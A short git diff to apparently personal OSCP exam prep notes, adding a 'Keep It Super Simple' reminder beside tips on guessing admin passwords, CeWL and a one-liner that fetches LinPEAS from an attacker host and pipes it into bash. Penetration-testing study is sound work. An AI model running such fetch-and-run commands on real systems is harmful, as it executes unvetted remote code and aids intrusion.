@@ -18,6 +18,7 @@ description: Just some rough notes in preparation for the OSCP.
 * If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
 * If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash:
   * `curl 10.10.10.1:8080/linpeas.sh | bash`
+* **REMEMBER KISS - Keep It Super Simple**. Several times I have tried to do something overly complicated when the first thing I would have tried would work.&#x20;
 
 ### Helpful Blogs
 
